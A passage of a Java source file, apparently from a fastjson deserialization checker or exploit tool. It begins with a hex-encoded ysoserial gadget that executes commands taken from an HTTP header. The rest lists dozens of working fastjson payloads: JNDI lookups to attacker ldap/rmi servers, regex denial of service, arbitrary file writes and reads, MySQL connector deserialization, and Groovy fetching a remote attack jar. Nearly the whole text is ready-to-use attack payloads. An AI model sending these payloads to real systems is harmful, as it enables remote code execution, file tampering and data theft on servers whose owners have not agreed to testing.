69656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;\"}}"));
        vulnerabilities.add(new Vulnerability("Check 1225-1241", "需开启autotype", "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/badNameClass\", \"autoCommit\":true}"));
        vulnerabilities.add(new Vulnerability("Check 1225-1242", "需开启autotype", "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:1389/badNameClass\", \"autoCommit\":true}"));
        vulnerabilities.add(new Vulnerability("Check 1225-1243", "需开启autotype", "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://localhost:1389/badNameClass\", \"autoCommit\":true}"));
        vulnerabilities.add(new Vulnerability("Check 1225-1245", "需开启autotype", "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://localhost:1389/badNameClass\"}}"));
        vulnerabilities.add(new Vulnerability("Check 1225-1247", "1.2.25-1.2.32需关闭autotype；1.2.33-1.2.47无影响", "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"ldap://localhost:1389/badNameClass\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1236-1262 DOS-1", "正则表达式拒绝服务漏洞", "{\n" +
                "    \"regex\":{\n" +
                "        \"$ref\":\"$[\\blue = /\\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]\"\n" +
                "    },\n" +
                "    \"blue\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1236-1262 DOS-2", "正则表达式拒绝服务漏洞", "{\n" +
                "    \"regex\":{\n" +
                "        \"$ref\":\"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']\"\n" +
                "    },\n" +
                "    \"blue\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 125-1259 -1", "需开启autotype", "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}"));
        vulnerabilities.add(new Vulnerability("Check 125-1259 -2", "需开启autotype", "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}"));
        vulnerabilities.add(new Vulnerability("Check 125-1260 -1", "需开启autotype", "{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://10.10.20.166:1099/ExportObject\"}"));
        vulnerabilities.add(new Vulnerability("Check 125-1260 -2", "需开启autotype", "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://10.10.20.166:1389/ExportObject\"}"));
        vulnerabilities.add(new Vulnerability("Check 125-1261", "需开启autotype", "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:1389/Exploit\",\"Object\":\"a\"}"));
        vulnerabilities.add(new Vulnerability("Check < 1262 xbean -1", "目标服务端需要存在xbean-reflect包", "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1098/exploit\"}"));
        vulnerabilities.add(new Vulnerability("Check < 1262 xbean -2", "目标服务端需要存在xbean-reflect包", "{\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://localhost:1389/Exploit\"}, \"namespace\":\"\"}"));
        //fastjson<=1.2.66
        vulnerabilities.add(new Vulnerability("Check <= 1266 shiro -1", "目标服务端需要存在shiro-core包", "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://192.168.80.1:1389/Calc\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1266 shiro -2", "目标服务端需要存在shiro-core包", "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"]"));
        vulnerabilities.add(new Vulnerability("Check <= 1266 dbcp -1", "目标服务端需要存在Anteros-Core和Anteros-DBCP包", "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://192.168.80.1:1389/Calc\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1266 dbcp -2", "目标服务端需要存在Anteros-Core和Anteros-DBCP包", "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1266 jta", "目标服务端需要存在ibatis-sqlmap和jta包", "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://192.168.80.1:1389/Calc\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1266 ibatis", "目标服务端需要存在ibatis-sqlmap和jta包", "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://192.168.80.1:1399/Calc\"}}"));
        vulnerabilities.add(new Vulnerability("Check <= 1266 output file", "写文件", "{\n" +
                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"sun.rmi.server.MarshalOutputStream\",\n" +
                "    \"out\": {\n" +
                "        \"@type\": \"java.util.zip.InflaterOutputStream\",\n" +
                "        \"out\": {\n" +
                "           \"@type\": \"java.io.FileOutputStream\",\n" +
                "           \"file\": \"/tmp/asdasd\",\n" +
                "           \"append\": true\n" +
                "        },\n" +
                "        \"infl\": {\n" +
                "           \"input\": {\n" +
                "               \"array\": \"eJxLLE5JTCkGAAh5AnE=\",\n" +
                "               \"limit\": 14\n" +
                "           }\n" +
                "        },\n" +
                "        \"bufLen\": \"100\"\n" +
                "    },\n" +
                "    \"protocolVersion\": 1\n" +
                "}"));
        //fastjson<=1.2.67
        vulnerabilities.add(new Vulnerability("Check <= 1267 jta", "目标服务端需要存在ignite-core、ignite-jta和jta包", "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"tm\": {\"$ref\":\"$.tm\"}}"));
        vulnerabilities.add(new Vulnerability("Check <= 1267 shiro", "目标服务端需要存在shiro-core和slf4j-api包", "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:1389/Exploit\",\"instance\":{\"$ref\":\"$.instance\"}}"));
        //fastjson<=1.2.68
        vulnerabilities.add(new Vulnerability("Check <= 1268 hadoop -1", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 hadoop -2", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 caucho -2", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:1389/Exploit\", \"value\": {\"$ref\":\"$.value\"}}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 exec", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"vul.VulAutoCloseable\",\"cmd\":\"calc\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 read file", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"C:/Windows/win.ini\", \"targetPath\":\"D:/wamp64/www/win.txt\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -1", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\n" +
                "    \"stream\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "        \"targetPath\": \"D:/wamp64/www/hacked.txt\",\n" +
                "        \"tempPath\": \"D:/wamp64/www/test.txt\"\n" +
                "    },\n" +
                "    \"writer\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
                "        \"buffer\": \"cHduZWQ=\",\n" +
                "        \"outputStream\": {\n" +
                "            \"$ref\": \"$.stream\"\n" +
                "        },\n" +
                "        \"position\": 5\n" +
                "    },\n" +
                "    \"close\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
                "        \"out\": {\n" +
                "            \"$ref\": \"$.writer\"\n" +
                "        }\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -2", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\n" +
                "    'stream':\n" +
                "    {\n" +
                "        '@type':\"java.lang.AutoCloseable\",\n" +
                "        '@type':'java.io.FileOutputStream',\n" +
                "        'file':'/tmp/nonexist',\n" +
                "        'append':false\n" +
                "    },\n" +
                "    'writer':\n" +
                "    {\n" +
                "        '@type':\"java.lang.AutoCloseable\",\n" +
                "        '@type':'org.apache.solr.common.util.FastOutputStream',\n" +
                "        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',\n" +
                "        'sink':\n" +
                "        {\n" +
                "            '$ref':'$.stream'\n" +
                "        },\n" +
                "        'start':38\n" +
                "    },\n" +
                "    'close':\n" +
                "    {\n" +
                "        '@type':\"java.lang.AutoCloseable\",\n" +
                "        '@type':'org.iq80.snappy.SnappyOutputStream',\n" +
                "        'out':\n" +
                "        {\n" +
                "            '$ref':'$.writer'\n" +
                "        }\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -3", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\n" +
                "  \"@type\": \"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"sun.rmi.server.MarshalOutputStream\",\n" +
                "  \"out\": {\n" +
                "    \"@type\": \"java.util.zip.InflaterOutputStream\",\n" +
                "    \"out\": {\n" +
                "      \"@type\": \"java.io.FileOutputStream\",\n" +
                "      \"file\": \"dst\",\n" +
                "      \"append\": \"false\"\n" +
                "    },\n" +
                "    \"infl\": {\n" +
                "      \"input\": \"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==\"\n" +
                "    },\n" +
                "    \"bufLen\": 1048576\n" +
                "  },\n" +
                "  \"protocolVersion\": 1\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -3", "利用类必须是expectClass类的子类或实现类，并且有相关依赖，position写入的长度，必须和base64编码前的长度一致", "{\n" +
                "    \"stream\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "        \"targetPath\": \"f:/pwn.txt\",\n" +
                "        \"tempPath\": \"\"\n" +
                "    },\n" +
                "    \"writer\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
                "        \"buffer\": \"YjF1M3I=\",\n" +
                "        \"outputStream\": {\n" +
                "            \"$ref\": \"$.stream\"\n" +
                "        },\n" +
                "        \"position\": 5\n" +
                "    },\n" +
                "    \"close\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
                "        \"out\": {\n" +
                "            \"$ref\": \"$.writer\"\n" +
                "        }\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -4", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\n" +
                " \"x\":{\n" +
                " \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                " \"input\":{\n" +
                " \"@type\":\"java.lang.AutoCloseable\",\n" +
                " \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
                " \"reader\":{\n" +
                " \"@type\":\"jdk.nashorn.api.scripting.URLReader\",\n" +
                " \"url\":\"http://127.0.0.1:8083/test.txt\"\n" +
                " },\n" +
                " \"charsetName\":\"UTF-8\",\n" +
                " \"bufferSize\":10000\n" +
                " },\n" +
                " \"branch\":{\n" +
                " \"@type\":\"java.lang.AutoCloseable\",\n" +
                " \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
                " \"writer\":{\n" +
                " \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
                " \"file\":\"/tmp/files/12345\",\n" +
                " \"encoding\":\"UTF-8\",\n" +
                " \"append\": true\n" +
                " },\n" +
                " \"charset\":\"UTF-8\",\n" +
                " \"bufferSize\": 8193,\n" +
                " \"writeImmediately\": true\n" +
                " },\n" +
                " \"trigger\":{\n" +
                " \"@type\":\"java.lang.AutoCloseable\",\n" +
                " \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                " \"is\":{\n" +
                " \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                " \"input\":{\n" +
                " \"$ref\":\"$.input\"\n" +
                " },\n" +
                " \"branch\":{\n" +
                " \"$ref\":\"$.branch\"\n" +
                " },\n" +
                " \"closeBranch\": true\n" +
                " },\n" +
                " \"httpContentType\":\"text/xml\",\n" +
                " \"lenient\":false,\n" +
                " \"defaultEncoding\":\"UTF-8\"\n" +
                " }\n" +
                " }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 Mysqlconnector -1", "Mysqlconnector 5.1.x，利用类必须是expectClass类的子类或实现类，并且有相关依赖，https://b1ue.cn/archives/506.html", "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"mysql.host\",\"portToConnectTo\":3306,\"info\":{\"user\":”user\",\"password\":\"pass\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"NUM_HOSTS\": \"1\"},\"databaseToConnectTo\":\"dbname\",\"url\":\"\"}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 Mysqlconnector -2", "Mysqlconnector 6.0.2 or 6.0.3，利用类必须是expectClass类的子类或实现类，并且有相关依赖，https://b1ue.cn/archives/506.html", "{\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\": \"jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true\"}}}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 Mysqlconnector -3", "Mysqlconnector 6.x or < 8.0.20，利用类必须是expectClass类的子类或实现类，并且有相关依赖，https://b1ue.cn/archives/506.html", "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\"proxy\":{\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\"connectionUrl\":{\"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\": [{\"host\":\"mysql.host\"}], \"slaves\":[], \"properties\":{\"host\":\"mysql.host\",\"user\":\"user\",\"dbname\":\"dbname\",\"password\":\"pass\",\"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"}}}}\n"));

        vulnerabilities.add(new Vulnerability("Check <= 1268 transaction -1", "有相关依赖", "{\"@type\":\"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 transaction -2", "有相关依赖", "{\"@type\":\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}"));
        vulnerabilities.add(new Vulnerability("Check <= 1268 transaction -2", "有相关依赖", "{\"@type\":\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}"));
        vulnerabilities.add(new Vulnerability("Check 1276-1283 step1", "有相关依赖", "{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "  \"unit\":{\n" +
                "  }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1276-1283 step2", "有相关依赖", "{\n" +
                "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "  \"config\":{\n" +
                "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "    \"classpathList\":[\"http://127.0.0.1:8433/attack-1.jar\"]\n" +
                "  },\n" +
                "  \"gcl\":null,\n" +
                "  \"destDir\": \"/tmp\"\n" +
                "}"));
        // 添加更多漏洞...

        return vulnerabilities;
    }
}

